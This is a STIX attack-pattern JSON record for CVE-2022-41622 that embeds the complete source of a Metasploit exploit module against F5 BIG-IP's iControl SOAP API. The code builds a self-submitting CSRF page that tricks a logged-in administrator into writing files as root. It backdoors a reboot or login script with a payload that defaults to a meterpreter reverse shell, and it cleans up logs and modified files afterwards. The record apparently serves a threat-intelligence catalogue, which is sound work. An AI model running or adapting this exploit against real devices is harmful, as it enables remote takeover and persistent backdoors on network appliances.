{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--33fe2cc0-c5be-411f-afb6-8f69dce52123",
    "created": "2024-08-14T17:02:39.679937Z",
    "modified": "2024-08-14T17:02:39.679941Z",
    "name": "F5 BIG-IP iControl CSRF File Write SOAP API",
    "description": " This module exploits a cross-site request forgery (CSRF) vulnerability in F5 Big-IP's iControl interface to write an arbitrary file to the filesystem.  While any file can be written to any location as root, the exploitability is limited by SELinux; the vast majority of writable locations are unavailable. By default, we write to a script that executes at reboot, which means the payload will execute the next time the server boots.  An alternate target - Login - will add a backdoor that executes next time a user logs in interactively. This overwrites a file but we restore it when we get a session  Note that because this is a CSRF vulnerability, it starts a web server, but an authenticated administrator must visit the site, which redirects them to the target. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/f5_icontrol_soap_csrf_rce_cve_2022_41622.rb",
            "external_id": "f5_icontrol_soap_csrf_rce_cve_2022_41622.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2022-41622"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/rbowes-r7/refreshing-soap-exploit"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2022/11/16/cve-2022-41622-and-cve-2022-41800-fixed-f5-big-ip-and-icontrol-rest-vulnerabilities-and-exposures/"
        },
        {
            "source_name": "reference",
            "url": "https://support.f5.com/csp/article/K97843387"
        },
        {
            "source_name": "reference",
            "url": "https://support.f5.com/csp/article/K94221585"
        },
        {
            "source_name": "reference",
            "url": "https://support.f5.com/csp/article/K05403841"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'F5 BIG-IP iControl CSRF File Write SOAP API',\n        'Description' => %q{\n          This module exploits a cross-site request forgery (CSRF) vulnerability\n          in F5 Big-IP's iControl interface to write an arbitrary file to the\n          filesystem.\n\n          While any file can be written to any location as root, the\n          exploitability is limited by SELinux; the vast majority of writable\n          locations are unavailable. By default, we write to a script that\n          executes at reboot, which means the payload will execute the next time\n          the server boots.\n\n          An alternate target - Login - will add a backdoor that executes next\n          time a user logs in interactively. This overwrites a file,\n          but we restore it when we get a session\n\n          Note that because this is a CSRF vulnerability, it starts a web\n          server, but an authenticated administrator must visit the site, which\n          redirects them to the target.\n        },\n        'Author' => [\n          'Ron Bowes' # Discovery, PoC, and module\n        ],\n        'References' => [\n          ['CVE', '2022-41622'],\n          ['URL', 'https://github.com/rbowes-r7/refreshing-soap-exploit'],\n          ['URL', 'https://www.rapid7.com/blog/post/2022/11/16/cve-2022-41622-and-cve-2022-41800-fixed-f5-big-ip-and-icontrol-rest-vulnerabilities-and-exposures/'],\n          ['URL', 'https://support.f5.com/csp/article/K97843387'],\n          ['URL', 'https://support.f5.com/csp/article/K94221585'],\n          ['URL', 'https://support.f5.com/csp/article/K05403841'],\n        ],\n        'License' => MSF_LICENSE,\n        'DisclosureDate' => '2022-11-16', # Vendor advisory\n        'Platform' => ['unix', 'linux'],\n        'Arch' => [ARCH_CMD],\n        'Type' => :unix_cmd,\n        'Privileged' => true,\n        'Targets' => [\n          [ 'Restart', {}, ],\n          [ 'Login', {}, ],\n          [ 'Custom', {}, ]\n        ],\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'RPORT' => 443,\n          'SSL' => true,\n          'Payload' => 'cmd/unix/python/meterpreter/reverse_tcp'\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [\n            IOC_IN_LOGS,\n            ARTIFACTS_ON_DISK\n          ]\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('TARGET_HOST', [true, 'The IP or domain name of the target F5 device']),\n        OptString.new('TARGET_URI', [true, 'The URI of the SOAP API', '/iControl/iControlPortal.cgi']),\n        OptBool.new('TARGET_SSL', [true, 'Use SSL for the upstream connection?', true]),\n        OptString.new('FILENAME', [false, 'The file on the target to overwrite (for \"custom\" target) - note that SELinux prevents overwriting a great deal of useful files']),\n      ]\n    )\n  end\n\n  def on_request_uri(socket, _request)\n    if datastore['TARGET'] == 0 # restart\n      filename = '/shared/f5_update_action'\n      file_payload = <<~EOT\n        UpdateAction\n        https://localhost/success`#{payload.encoded}`\n        https://localhost/error\n        0\n        0\n        0\n        0\n      EOT\n\n      # Delete the logfile if we get a session\n      register_file_for_cleanup('/var/log/f5_update_checker.out')\n\n      print_status(\"Redirecting the admin to overwrite #{filename}; if successful, your session will come approximately 2 minutes after the target is rebooted\")\n    elsif datastore['TARGET'] == 1 # login\n      filename = '/var/run/config/timeout.sh'\n      file_payload = \"#{payload.encoded} & disown;\"\n\n      # Delete the backdoored file if we get a session.. this will be fixed at\n      # next reboot\n      register_file_for_cleanup('/var/run/config/timeout.sh')\n\n      print_status(\"Redirecting the admin to overwrite #{filename}; if successful, your session will come the next time a user logs in interactively\")\n    else # Custom\n\n      filename = datastore['FILENAME']\n      file_payload = payload.encoded\n\n      print_status(\"Redirecting the admin to overwrite #{filename} with the payload\")\n    end\n\n    # Build the SOAP request that'll be sent to the target server\n    csrf_payload = %(\n    <soapenv:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:con=\"urn:iControl:System/ConfigSync\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <con:upload_file soapenv:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\n        <file_name xsi:type=\"xsd:string\">#{filename}</file_name>\n         <file_context xsi:type=\"urn:System.ConfigSync.FileTransferContext\" xmlns:urn=\"urn:iControl\">\n            <!--type: Common.OctetSequence-->\n            <file_data xsi:type=\"urn:Common.OctetSequence\">#{Rex::Text.encode_base64(file_payload)}</file_data>\n            <chain_type xsi:type=\"urn:Common.FileChainType\">FILE_FIRST_AND_LAST</chain_type>\n         </file_context>\n      </con:upload_file>\n   </soapenv:Body>\n</soapenv:Envelope>\n    )\n\n    # Build the target URL\n    target_url = \"#{datastore['TARGET_SSL'] ? 'https' : 'http'}://#{datastore['TARGET_HOST']}#{datastore['TARGET_URI']}\"\n\n    # Build the HTML payload that'll send the SOAP request via the user's browser\n    html_payload = %(\n<html>\n    <body>\n        <form action=\"#{target_url}\" method=\"POST\" enctype=\"text/plain\">\n            <textarea id=\"payload\" name=\"&lt;!--\">--&gt;#{Rex::Text.html_encode(csrf_payload)}</textarea>\n        </form>\n        <script>\n            document.forms[0].submit();\n        </script>\n    </body>\n</html>\n    )\n\n    # Send the HTML to the browser\n    send_response(socket, html_payload, { 'Content-Type' => 'text/html' })\n  end\n\n  def exploit\n    # Sanity check\n    if datastore['TARGET'] == 2 && (!datastore['FILENAME'] || datastore['FILENAME'].empty?)\n      fail_with(Failure::BadConfig, 'For custom targets, please provide the FILENAME')\n    end\n\n    print_good('Starting HTTP server; an administrator with an active HTTP Basic session will need to load the URL below')\n    super\n  end\nend\n",
    "x_mitre_disclosure_date": "2022-11-16, # Vendor advisory",
    "x_mitre_platforms": [
        "['unix', 'linux']"
    ]
}